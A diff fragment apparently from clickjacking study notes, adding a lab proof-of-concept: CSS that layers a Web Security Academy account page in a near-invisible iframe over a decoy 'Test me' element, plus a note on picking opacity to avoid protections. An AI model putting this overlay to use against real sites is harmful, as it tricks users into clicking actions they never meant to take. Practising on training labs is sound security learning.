@@ -42,3 +42,22 @@
 # The attacker selects opacity values so that the desired effect is achieved without triggering protection behaviors. 
 
 
+                                 <style>
+                        iframe {
+                            position:relative;
+                            width:1000px;
+                            height: 700px;
+                            opacity: 0.0001;
+                            z-index: 2;
+                        }
+                        div {
+                            position:absolute;
+                            top: 515px;
+                            left:60px;
+                            z-index: 1;
+                        }
+                    </style>
+                    <div>Test me</div>
+                    <iframe src="https://0acb009004e04ce4c024c66300910047.web-security-academy.net/my-account"></iframe>
+
+
